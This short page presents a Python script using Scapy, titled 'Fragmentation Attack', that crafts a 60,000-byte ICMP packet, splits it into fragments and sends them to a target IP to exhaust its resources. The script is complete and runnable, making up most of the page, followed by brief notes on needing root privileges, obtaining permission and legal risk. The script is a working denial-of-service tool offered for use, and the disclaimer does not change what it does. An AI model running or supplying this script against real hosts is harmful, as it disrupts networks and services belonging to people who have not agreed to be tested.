# Fragmentation Attack

Fragmentation Attack

Fragmentation attacks involve sending fragmented packets to exhaust resources on the target system.

from scapy.all import \*

def fragmentation\_attack(target\_ip):

\# Crafting a large packet and fragmenting it

payload = "X" \* 60000 # Large payload

pkt = IP(dst=target\_ip)/ICMP()/payload

frags = fragment(pkt, fragsize=1480) # Fragment size (MTU)

for frag in frags:

send(frag, verbose=0)

print(f"Sent fragmented ICMP packet to {target\_ip}")

if \_\_name\_\_ == "\_\_main\_\_":

fragmentation\_attack("192.168.1.1")

**Important Considerations**

* **Root/Admin Privileges:** Sending raw packets usually requires root or administrator privileges. You may need to run the scripts with elevated privileges.
* **Use:** This script can cause significant disruption if used irresponsibly. Always ensure you have explicit permission before conducting any tests.
* **Legal:** Unauthorized use of these techniques can lead to legal actions, fines, or imprisonment. Use them only in environments where you are authorized.
